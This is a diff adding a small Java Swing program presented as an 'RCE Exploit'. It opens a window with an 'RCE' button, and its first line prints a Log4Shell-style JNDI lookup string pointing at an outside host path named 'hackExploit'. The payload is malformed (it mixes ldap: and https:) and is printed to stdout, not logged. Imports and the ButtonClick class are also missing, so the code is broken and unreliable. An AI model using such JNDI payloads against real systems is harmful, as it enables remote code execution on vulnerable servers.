@@ -1,0 +1,24 @@
+public class Main {
+
+        public static void main(String[] args) throws IOException {
+            System.out.println("${jndi:ldap:https://hjagfdyjsalkd.cjy/hackExploit}");
+            JFrame frame = new JFrame("RCE Exploit");
+            JPanel panel = new JPanel();
+            panel.setLayout(new FlowLayout());
+            JLabel label = new JLabel("Rce Exploit");
+            JButton button = new JButton();
+            button.setText("RCE");
+            button.setLocation(new Point(100, 100));
+            button.setSize(100, 100);
+            button.addActionListener(new ButtonClick());
+            panel.add(label);
+            panel.add(button);
+            frame.add(panel);
+            frame.setSize(600, 600);
+            frame.setLocationRelativeTo(null);
+            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+            frame.setVisible(true);
+        }
+
+
+}
